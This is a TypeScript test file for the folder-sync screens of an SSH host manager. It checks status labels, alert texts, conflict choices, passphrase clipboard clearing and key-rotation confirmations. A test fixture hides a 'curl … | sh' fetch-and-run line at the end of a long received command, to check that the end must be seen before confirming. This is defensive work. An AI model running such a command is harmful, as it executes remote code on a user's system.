// Checks of the folder sync wording and helpers (src/lib/syncview.ts), run
// by `pnpm check`. Node's built-in test runner, no dependency.
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import type { AlertKind, ConflictSide, FolderReason, SyncStatus } from "../src/lib/api.ts";
import { codeSpans, sentence } from "../src/lib/api.ts";
import { CLIPBOARD_CLEAR_MS, COPIED_NOTE, copySecret } from "../src/lib/secretclip.ts";
import {
  ago,
  commandLines,
  commandStats,
  conflictRows,
  countsText,
  defaultChoice,
  destination,
  deviceName,
  explainAlert,
  explainFolder,
  explainWait,
  JOIN_TTL_MS,
  keyEntryLabel,
  keysNeedYou,
  listText,
  probeVerdict,
  scrolledToEnd,
  strengthView,
  syncLabel,
  validityLeft,
  ADOPT_UNSURE,
  ADOPT_UNSURE_AFTER_R1,
  CLOUD_TEXT,
  cloudReminder,
  cloudTitle,
  deviceToUpdate,
  forgetAbout,
  forgottenResult,
  HELD_ARM_MS,
  heldArmed,
  KEEP_MINE_TEXT,
  keepCost,
  LEAVE_NOTE,
  newKeysTitle,
  OLD_KEY_CONSEQUENCE,
  panelConfirm,
  RESET_WORD,
  reusedHint,
  ROTATE_ABOUT,
  ROTATION_PENDING_LABEL,
  rotationAfterTimeout,
  TYPE_NOTHING,
  Y_DELAY,
  yArmed,
  heldText,
} from "../src/lib/syncview.ts";

const source = (path: string) => readFileSync(new URL(`../src/lib/${path}`, import.meta.url), "utf8");

const NOW = 1_800_000_000_000;
const secs = NOW / 1000;

test("relative times read like the TUI's", () => {
  assert.equal(ago(secs - 10, NOW), "just now");
  assert.equal(ago(secs - 120, NOW), "2 min ago");
  assert.equal(ago(secs - 3 * 3600, NOW), "3 h ago");
  assert.equal(ago(secs - 2 * 86400, NOW), "2 d ago");
  // A clock ahead of ours never shows a negative time.
  assert.equal(ago(secs + 500, NOW), "just now");
});

test("every status has a label and a tone", () => {
  const cases: [SyncStatus, string, string][] = [
    [{ state: "disabled" }, "Sync off", "muted"],
    [{ state: "locked" }, "Sync locked", "warning"],
    [{ state: "idle", last_pass: secs - 120, devices: 2, conflicts: 0, issues: 0, pending_confirmations: 0 }, "Synced 2 min ago", "quiet"],
    [{ state: "syncing" }, "Syncing…", "busy"],
    // The name only: the id is in the item's title.
    [{ state: "waiting", reason: "placeholder", device: "laptop (3f9c0ae1)" }, "Waiting for laptop", "busy"],
    [{ state: "folder_unavailable", reason: "missing" }, "Sync folder unavailable", "warning"],
    [{ state: "alert", kind: "fork", device: null }, "Sync alert", "error"],
    [{ state: "error", summary: { code: "sync_corrupt", message: "x", hint: null } }, "Sync failed", "error"],
  ];
  for (const [status, label, tone] of cases) assert.deepEqual(syncLabel(status, NOW), { label, tone });
});

test("alerts name the device and say what to do", () => {
  const kinds: AlertKind[] = [
    "rollback",
    "fork",
    "restored",
    "bundle_tampered",
    "keys_rotated_elsewhere",
    "passphrase_changed",
    "third_party_claim",
    "merge_refused",
    "divergent",
    "dropped_values",
    "rotation_conflict",
    "device_forgotten",
    "revoked_writes",
  ];
  for (const kind of kinds) {
    const e = explainAlert(kind, "laptop (3f9c0ae1)");
    assert.ok(e.title && e.hint, kind);
  }
  assert.match(explainAlert("passphrase_changed", "laptop (3f9c0ae1)").body, /laptop \(3f9c0ae1\)/);
  assert.match(explainAlert("fork", null).body, /another device/);
  const reasons: FolderReason[] = ["missing", "not_mounted", "permission_denied", "bundle_missing", "unsafe", "too_many_entries"];
  for (const r of reasons) assert.ok(explainFolder(r).hint, r);
});

test("probe verdicts", () => {
  assert.equal(probeVerdict({ kind: "usable" }).tone, "ok");
  assert.equal(probeVerdict({ kind: "existing_bundle", devices: 1 }).title, "A Portico sync with 1 device");
  assert.equal(probeVerdict({ kind: "incomplete" }).tone, "wait");
  const refused = probeVerdict({ kind: "refused", summary: { code: "sync_folder_unsafe", message: "inside ~/.ssh", hint: "Choose another" } });
  assert.deepEqual([refused.tone, refused.title, refused.hint], ["error", "inside ~/.ssh", "Choose another"]);
});

test("the meter follows the core's verdict, not its own guess", () => {
  assert.equal(strengthView(80, false).tone, "weak");
  assert.equal(strengthView(62, true).tone, "fair");
  assert.equal(strengthView(90, true).tone, "good");
  assert.ok(strengthView(0, false).fill > 0);
  assert.equal(strengthView(500, true).fill, 1);
});

const side = (index: number, value: ConflictSide["value"], local = false): ConflictSide => ({ index, devices: [local ? "me (00000000)" : "laptop (3f9c0ae1)"], local, at: secs, value });

test("tags preselect the union, snippets keep both, other records this device's side", () => {
  assert.deepEqual(defaultChoice([side(0, { type: "tags", value: ["a"] }, true), side(1, { type: "tags", value: ["b"] })]), { type: "union" });
  const snippet = { name: "x", command: "ls", description: null, run: true };
  assert.deepEqual(defaultChoice([side(0, { type: "snippet", value: snippet }), side(1, { type: "snippet", value: { ...snippet, command: "ls -l" } }, true)]), {
    type: "keep_both",
    keep: 1,
  });
  assert.deepEqual(defaultChoice([side(0, { type: "text", value: "a" }), side(1, { type: "text", value: "b" }, true)]), { type: "pick", index: 1 });
});

test("conflict rows mark the fields that differ", () => {
  const host = { hostname: "a.example", user: "ops", port: null, identity_file: null, proxy_jump: null };
  const rows = conflictRows([side(0, { type: "host", value: host }, true), side(1, { type: "host", value: { ...host, port: 2222 } })]);
  const port = rows.find((r) => r.field === "Port");
  assert.deepEqual(port, { field: "Port", values: ["—", "2222"], differs: true });
  assert.equal(rows.find((r) => r.field === "HostName")?.differs, false);
  const deleted = conflictRows([side(0, { type: "host", value: host }), side(1, { type: "deleted" })]);
  assert.equal(deleted[0]?.values[1], "(deleted)");
});

test("destinations read like ssh", () => {
  assert.equal(destination({ hostname: "h", user: "u", port: 22, identity_file: null, proxy_jump: "b" }), "u@h via b");
  assert.equal(destination({ hostname: "h", user: null, port: 2222, identity_file: null, proxy_jump: null }), "h:2222");
});

test("device names drop the id where room is short; counts read as words", () => {
  assert.equal(deviceName("studio-mac (3f9c0ae1)"), "studio-mac");
  assert.equal(deviceName("studio-mac"), "studio-mac");
  assert.equal(countsText(2, 3), "2 conflicts · 3 to review");
  assert.equal(countsText(1, 0), "1 conflict");
  assert.equal(countsText(0, 1), "1 to review");
});

test("the join review says how long it stays valid", () => {
  assert.equal(validityLeft(NOW, NOW), "Valid for 10 more min");
  assert.equal(validityLeft(NOW, NOW + 9.5 * 60_000), "Valid for 1 more min");
  assert.equal(validityLeft(NOW, NOW + JOIN_TTL_MS), "Expired");
});

// ── A received command (S1c review A1, A2) ──

const LONG = Array.from({ length: 200 }, (_, i) => (i === 199 ? "curl -s https://example.invalid/x | sh" : `echo step ${i + 1}`)).join("\n");

test("a received command shows its line and character counts", () => {
  assert.equal(commandStats("ls"), "1 line · 2 characters");
  assert.equal(commandStats(LONG).split(" · ")[0], "200 lines");
  assert.match(commandStats(LONG), /^200 lines · [\d,]+ characters$/);
  // A trailing newline is an extra Enter: a numbered, empty last line.
  assert.equal(commandLines("ls\n").length, 2);
  assert.deepEqual(commandLines("ls\n")[1], []);
});

test("a received command shows its tabs and control characters", () => {
  const [line] = commandLines("a\tb\rc\u001b[0m");
  assert.deepEqual(line, [
    { text: "a", mark: null },
    { text: "\t", mark: "→" },
    { text: "b", mark: null },
    { text: "\r", mark: "␍" },
    { text: "c", mark: null },
    { text: "\u001b", mark: "␛" },
    { text: "[0m", mark: null },
  ]);
  // Nothing is dropped: the pieces put back are the command.
  assert.equal(commandLines("x\ty\nz").map((l) => l.map((p) => p.text).join("")).join("\n"), "x\ty\nz");
});

test("a long received command is confirmable only once its end was on screen", () => {
  // 200 lines of 21 px in a 320 px box: at the top, not at the end.
  const lineHeight = 21;
  const scrollHeight = 200 * lineHeight;
  assert.equal(scrolledToEnd(0, 320, scrollHeight), false);
  assert.equal(scrolledToEnd(scrollHeight - 320 - 40, 320, scrollHeight), false);
  assert.equal(scrolledToEnd(scrollHeight - 320, 320, scrollHeight), true);
  // Rounding of fractional scroll positions.
  assert.equal(scrolledToEnd(scrollHeight - 320.6, 320, scrollHeight), true);
  // A short command does not scroll: confirmable at once.
  assert.equal(scrolledToEnd(0, 320, 84), true);
  // The review wires it: Confirm (button and `y`) waits for `seenEnd`,
  // reset with a new content, and the counts are shown.
  const review = source("components/SyncReview.svelte");
  assert.match(review, /const confirmable = \$derived\([^)]*seenEnd\)/);
  assert.match(review, /disabled=\{!confirmable\}/);
  assert.match(review, /if \(confirm && !confirmable\) return;/);
  assert.match(review, /data-testid="sync-snippet-stats">\{commandStats\(/);
  assert.match(review, /seenEnd = false;/);
  // y / n, never c / r, never Enter.
  assert.match(review, /key === "y"/);
  assert.doesNotMatch(review, /key === "c"|key === "Enter"/);
});

// ── Received hosts (S1c review A6) ──

test("received hosts start unticked, with no select-all", () => {
  const received = source("components/SyncReceived.svelte");
  assert.match(received, /let ticked: Record<string, boolean> = \$state\(\{\}\);/);
  assert.doesNotMatch(received, /select all|selectAll|select-all/i);
  // Each host is ticked on its own checkbox, next to its destination.
  assert.match(received, /bind:checked=\{ticked\[keyOf\(p\)\]\}/);
});

// ── Generated passphrase (S1c review A3, A4) ──

test("a generated passphrase is dropped in Rust when its dialog closes", () => {
  for (const file of ["components/SyncWizard.svelte", "components/SyncForms.svelte"]) {
    assert.match(source(file), /onDestroy\(\(\) => void backend\.syncForgetGenerated\(\)/, file);
  }
  assert.match(source("components/SyncPassphraseFields.svelte"), /function typeOwn\(\) \{[^}]*syncForgetGenerated\(\)/);
});

function fakeClipboard(readable = true) {
  const clip = {
    text: "",
    writes: [] as string[],
    async writeText(t: string) {
      clip.text = t;
      clip.writes.push(t);
    },
    readText: readable
      ? async () => clip.text
      : async () => {
          throw new Error("not allowed");
        },
  };
  return clip;
}

function manualTimer() {
  const pending: { run: () => void; ms: number }[] = [];
  return { schedule: (run: () => void, ms: number) => pending.push({ run, ms }), pending };
}

test("a copied passphrase leaves the clipboard after 30 s", async () => {
  assert.equal(COPIED_NOTE, "Copied — cleared from the clipboard in 30 s");
  const clip = fakeClipboard();
  const timer = manualTimer();
  const { cleared } = await copySecret("alpha bravo charlie", clip, timer.schedule);
  assert.equal(clip.text, "alpha bravo charlie");
  assert.equal(timer.pending[0]?.ms, CLIPBOARD_CLEAR_MS);
  timer.pending[0]?.run();
  assert.equal(await cleared, true);
  assert.equal(clip.text, "");
});

test("the clipboard is left alone once the user copied something else", async () => {
  const clip = fakeClipboard();
  const timer = manualTimer();
  const { cleared } = await copySecret("alpha bravo charlie", clip, timer.schedule);
  clip.text = "something the user copied";
  timer.pending[0]?.run();
  assert.equal(await cleared, false);
  assert.equal(clip.text, "something the user copied");
});

test("an unreadable clipboard is emptied only by the latest copy", async () => {
  const clip = fakeClipboard(false);
  const timer = manualTimer();
  const first = await copySecret("first secret words", clip, timer.schedule);
  const second = await copySecret("second secret words", clip, timer.schedule);
  timer.pending[0]?.run();
  assert.equal(await first.cleared, false);
  assert.equal(clip.text, "second secret words");
  timer.pending[1]?.run();
  assert.equal(await second.cleared, true);
  assert.equal(clip.text, "");
});

// ── Core messages (S1c review B2) ──

test("an alias leading a core message is never capitalized", () => {
  // The core puts identifiers in backticks: `sentence` leaves them as written.
  assert.equal(sentence("`legacy` is already defined"), "`legacy` is already defined");
  assert.deepEqual(codeSpans(sentence("`legacy` is already defined")), [
    { text: "legacy", code: true },
    { text: " is already defined", code: false },
  ]);
  assert.equal(sentence("received host `legacy` is hidden"), "Received host `legacy` is hidden");
});

// ── Conflicts (S1c review A5) ──

test("a conflict choice is bound to the sides shown", () => {
  const conflicts = source("components/SyncConflicts.svelte");
  // Choices are keyed by id and sides hash: new sides start from the default.
  assert.match(conflicts, /const keyOf = \(c: SyncConflict\) => `\$\{c\.id\}\\u0000\$\{c\.sides_hash\}`/);
  assert.match(conflicts, /choices\[keyOf\(c\)\] \?\? defaultChoice\(c\.sides\)/);
  assert.match(conflicts, /if \(!live\.has\(k\)\) delete choices\[k\]/);
  // The resolution names the sides it was chosen for.
  assert.match(conflicts, /backend\.syncResolve\(c\.id, choiceOf\(c\), c\.sides_hash\)/);
});

test("S2c-1: key states have their own status-bar labels (same words as the TUI)", () => {
  const laptop = "laptop (3f9c0ae1)";
  const cases: [SyncStatus, string, string][] = [
    [{ state: "waiting", reason: "rotation_pending", device: null }, "Finishing the key rotation…", "busy"],
    [{ state: "waiting", reason: "needs_new_keys", device: laptop }, "New keys needed on laptop", "warning"],
    [{ state: "waiting", reason: "needs_new_keys", device: null }, "New keys needed", "warning"],
    [{ state: "alert", kind: "keys_rotated_elsewhere", device: laptop }, "Keys changed — enter new passphrase", "warning"],
    [{ state: "alert", kind: "rotation_conflict", device: laptop }, "Key conflict", "error"],
    [{ state: "alert", kind: "device_forgotten", device: laptop }, "Removed from sync", "error"],
    [{ state: "alert", kind: "revoked_writes", device: laptop }, "Changes from a removed device", "error"],
  ];
  for (const [status, label, tone] of cases) assert.deepEqual(syncLabel(status, NOW), { label, tone });
});

test("S2c-1: key alerts name the device and say what to do", () => {
  const laptop = "laptop (3f9c0ae1)";
  const adopt = explainAlert("keys_rotated_elsewhere", laptop);
  assert.equal(adopt.title, `${laptop} reports new keys`);
  assert.equal(newKeysTitle(null), "Another device reports new keys");
  assert.match(adopt.body, /NEW passphrase/);
  assert.equal(adopt.hint, ADOPT_UNSURE);
  assert.match(adopt.hint, /type nothing and ask who did/);
  // "Remove the file…" only when the core lists such files (Overview, adoption).
  assert.ok(!/remove the file/i.test(adopt.hint));
  assert.equal(explainAlert("revoked_writes", "workstation (a07d51c2)").hint, "Enter the new passphrase on workstation (a07d51c2). Values held on this device wait in Received.");
  assert.match(explainAlert("rotation_conflict", laptop).body, /laptop \(3f9c0ae1\) and this device/);
  assert.match(explainAlert("rotation_conflict", laptop).hint, /keep this device's keys/);
  const forgotten = explainAlert("device_forgotten", laptop);
  assert.match(forgotten.body, /laptop \(3f9c0ae1\) removed this device/);
  assert.match(forgotten.hint, /join again as a new device/);
  assert.match(explainAlert("revoked_writes", laptop).body, /laptop \(3f9c0ae1\) relays/);
  assert.match(explainWait("needs_new_keys", laptop), /laptop \(3f9c0ae1\) still uses the old keys/);
  assert.match(explainWait("rotation_pending", null), /saved on this device/);
});

test("S2c-1: helpers", () => {
  assert.equal(listText([]), "");
  assert.equal(listText(["a"]), "a");
  assert.equal(listText(["a", "b", "c"]), "a, b and c");
  assert.equal(keyEntryLabel({ bundle: "9c1e4a07b2d3", epoch: 1, this_bundle: true }), "Old keys (rotation 1) · this sync · not in use");
  assert.equal(keyEntryLabel({ bundle: "9c1e4a07b2d3", epoch: 3, this_bundle: false }), "Old keys (rotation 3) · another sync (9c1e4a07) · not in use");
  assert.equal(deviceToUpdate("workstation (a07d51c2)", ["workstation (a07d51c2)"]), "workstation (a07d51c2) — update Portico first");
  assert.equal(deviceToUpdate("studio-mac (3f9c0ae1)", ["workstation (a07d51c2)"]), "studio-mac (3f9c0ae1)");
  // RESET_WORD is defined once, in syncview.ts.
  assert.equal(RESET_WORD, "reset");
  assert.ok(!/const RESET_WORD/.test(source("components/SyncForms.svelte")));
  assert.equal(keysNeedYou({ state: "alert", kind: "keys_rotated_elsewhere", device: null }), "adopt");
  assert.equal(keysNeedYou({ state: "alert", kind: "rotation_conflict", device: null }), "conflict");
  assert.equal(keysNeedYou({ state: "alert", kind: "device_forgotten", device: null }), "forgotten");
  assert.equal(keysNeedYou({ state: "alert", kind: "fork", device: null }), null);
  assert.equal(keysNeedYou({ state: "locked" }), null);
});

test("S2c-1: passphrases never linger in the key dialogs", () => {
  // Each dialog clears its secret fields when it sends them and when it closes.
  for (const file of ["SyncRotate.svelte", "SyncAdopt.svelte", "SyncKeyConflict.svelte"]) {
    const text = source(`components/${file}`);
    assert.match(text, /onDestroy\(/, file);
    assert.ok(!/console\.(log|debug|info)/.test(text), `${file} logs nothing`);
  }
  // The final rotation step is a security action: `y`, never Enter.
  const rotate = source("components/SyncRotate.svelte");
  assert.match(rotate, /step === "new" && key === "y"/);
  assert.match(source("components/SyncKeyConflict.svelte"), /choice === "keep" && key === "y"/);
});

test("panel_y_only_confirms_the_question_on_screen", () => {
  // A removal armed on one tab is never confirmed from another (A1).
  assert.equal(panelConfirm("overview", true, false), "discard");
  assert.equal(panelConfirm("devices", false, true), "remove");
  assert.equal(panelConfirm("devices", true, false), null);
  assert.equal(panelConfirm("overview", false, true), null);
  assert.equal(panelConfirm("received", true, true), null);
  const panel = source("components/SyncPanel.svelte");
  // Switching tabs drops both questions; asking one drops the other.
  assert.match(panel, /function go\(id: SyncTab\) \{\n\s*\/\/[^\n]*\n\s*discarding = null;\n\s*removingKey = null;/);
  assert.match(panel, /function askRemoveKey\(entry: SyncKeyEntry \| null\) \{\n\s*discarding = null;/);
  assert.match(panel, /if \(discarding\) untrack\(\(\) => \(removingKey = null\)\)/);
  assert.match(panel, /panelConfirm\(tab, !!discarding, !!removingKey\)/);
});

test("rotate_y_right_after_ticking_saved_is_ignored", () => {
  // Space on "I saved it" then `y` at once: ignored; Y_DELAY later: answered (A2).
  const t = 10_000;
  assert.equal(Y_DELAY, 150);
  assert.equal(yArmed(null, t), false);
  assert.equal(yArmed(t, t), false);
  assert.equal(yArmed(t, t + 100), false);
  assert.equal(yArmed(t, t + Y_DELAY), true);
  for (const file of ["SyncRotate.svelte", "SyncKeyConflict.svelte", "SyncForms.svelte"]) {
    const text = source(`components/${file}`);
    assert.match(text, /readyAt = (finalReady|ready) \? performance\.now\(\) : null/, file);
    assert.match(text, /yArmed\(readyAt, performance\.now\(\)\)\) void submit\(\)/, file);
  }
  // A held key never answers; a key a field already handled is not answered twice.
  const modal = source("components/Modal.svelte");
  assert.match(modal, /!e\.repeat &&\n\s*!e\.defaultPrevented/);
  assert.match(modal, /onkey && !e\.repeat && !e\.metaKey/);
});

test("held_decision_waits_after_list_change", () => {
  // Like the TUI's armed(data, now): HELD_ARM_MS after the list changed (A3).
  assert.equal(HELD_ARM_MS, 400);
  assert.equal(heldArmed(1000, 1399), false);
  assert.equal(heldArmed(1000, 1400), true);
  const received = source("components/SyncReceived.svelte");
  assert.match(received, /disabled=\{!!heldBusy \|\| !heldArmed\}/);
  // Busy until the list was read again: the next card is never decided from a stale list.
  assert.match(received, /await sync\.reloadPending\(\);\n\s*heldBusy = null;/);
  assert.match(received, /if \(heldBusy \|\| !heldArmed\) return;/);
  // The decision carries the hash of what was shown; the list re-arms when a hash changes.
  assert.match(received, /backend\.syncRevokedValue\(item\.key, choice, item\.hash\)/);
  assert.match(received, /\$\{h\.key\}\\u0001\$\{h\.hash\}/);
  assert.equal(heldText({ type: "snippet", value: { name: "Tail logs", command: "journalctl -fu nginx", description: null, run: true } }), "Tail logs — journalctl -fu nginx");
  assert.equal(heldText({ type: "tags", value: ["prod", "web"] }), "#prod #web");
});

test("rotation_timeout_does_not_ask_for_another_passphrase", () => {
  const idle: SyncStatus = { state: "idle", last_pass: secs, devices: 2, conflicts: 0, issues: 0, pending_confirmations: 0 };
  // While the core says "folder unavailable" (its limit), nothing is known.
  assert.equal(rotationAfterTimeout({ state: "folder_unavailable", reason: "not_mounted" }, 1, 1), "unknown");
  assert.equal(rotationAfterTimeout(null, 1, 2), "unknown");
  assert.equal(rotationAfterTimeout({ state: "waiting", reason: "rotation_pending", device: null }, 1, 1), "pending");
  assert.equal(rotationAfterTimeout(idle, 2, 3), "done");
  assert.equal(rotationAfterTimeout(idle, 2, 2), "failed");
  // An epoch not known on either side: still unknown, never "failed".
  assert.equal(rotationAfterTimeout(idle, null, 3), "unknown");
  assert.equal(rotationAfterTimeout(idle, 2, null), "unknown");
  const rotate = source("components/SyncRotate.svelte");
  assert.match(rotate, /if \(failed\.code === TIMEOUT\) \{[^}]*step = "checking";/);
  // The checking step offers no passphrase field and no rotate button.
  assert.match(rotate, /\{:else if step === "checking"\}\n\s*<button class="secondary" onclick=\{close\}>Close/);
  const conflict = source("components/SyncKeyConflict.svelte");
  assert.match(conflict, /if \(failed\.code === TIMEOUT\) \{[^}]*checking = true;/);
});

test("S2c-1 review B8: shared security texts, word for word as in the TUI", () => {
  assert.equal(TYPE_NOTHING, "If you did not change the keys on another device, type nothing.");
  assert.match(ROTATE_ABOUT, /What was synced before stays readable to whoever had the old keys\.$/);
  assert.match(LEAVE_NOTE, /this device can still read the current sync until the next rotation/);
  assert.equal(forgottenResult(["old-phone (5d0e9b33)"]), "Forgotten: old-phone (5d0e9b33). It cannot read what is synced from now on.");
  assert.equal(cloudTitle("old-phone (5d0e9b33)"), "Also remove old-phone (5d0e9b33)'s access to your cloud folder");
  assert.match(cloudReminder(["old-phone (5d0e9b33)"]), /^Also remove old-phone \(5d0e9b33\)'s access to your cloud folder/);
  assert.equal(OLD_KEY_CONSEQUENCE, "Files sealed only with it can no longer be read here.");
  assert.match(keepCost("studio-mac"), /Portico cannot see which: check on studio-mac\.$/);
  assert.match(reusedHint("rotation"), /^Portico accepted this passphrase before/);
  assert.match(reusedHint("adoption"), /^This is an old passphrase, not a new one\./);
  // The TUI holds the same words (the texts it shares with the GUI).
  const tui = (path: string) => readFileSync(new URL(`../../portico-tui/src/${path}`, import.meta.url), "utf8").replace(/"\s*\n\s*"/g, "");
  const tuiTexts = tui("ui/sync/rotate.rs") + tui("ui/sync.rs") + tui("sync_panel.rs");
  for (const text of [TYPE_NOTHING, ADOPT_UNSURE_AFTER_R1, ROTATE_ABOUT, KEEP_MINE_TEXT, CLOUD_TEXT, LEAVE_NOTE, OLD_KEY_CONSEQUENCE, reusedHint("rotation"), reusedHint("adoption")]) assert.ok(tuiTexts.includes(text), `TUI says: ${text}`);
  assert.ok(tuiTexts.includes(forgetAbout("{label}")), "TUI forget text");
  // The dialogs choose the refusal's hint by code, never by message.
  for (const file of ["SyncRotate.svelte", "SyncAdopt.svelte", "SyncKeyConflict.svelte"]) assert.ok(!/message\.(includes|match|startsWith)/.test(source(`components/${file}`)), file);
});

test("S2c-1 review B5: one tone per key state, as in the TUI", () => {
  const tone = (status: SyncStatus) => syncLabel(status, NOW).tone;
  assert.equal(tone({ state: "alert", kind: "keys_rotated_elsewhere", device: null }), "warning");
  assert.equal(tone({ state: "alert", kind: "rotation_conflict", device: null }), "error");
  assert.equal(tone({ state: "alert", kind: "device_forgotten", device: null }), "error");
  assert.equal(tone({ state: "alert", kind: "revoked_writes", device: null }), "error");
  assert.equal(tone({ state: "waiting", reason: "rotation_pending", device: null }), "busy");
  assert.equal(tone({ state: "waiting", reason: "needs_new_keys", device: null }), "warning");
  assert.equal(syncLabel({ state: "waiting", reason: "rotation_pending", device: null }, NOW).label, ROTATION_PENDING_LABEL);
  // The panel's dot stays still while the rotation waits for the folder.
  assert.match(source("components/SyncPanel.svelte"), /class:busy=\{head\.tone === "busy" && !pendingRotation\}/);
  // The status item's `!` is a compact-window pill, in the item's tone.
  const item = source("components/SyncStatusItem.svelte");
  assert.match(item, /class:error=\{view\.tone === "error"\} class:warning=\{view\.tone !== "error"\}/);
});
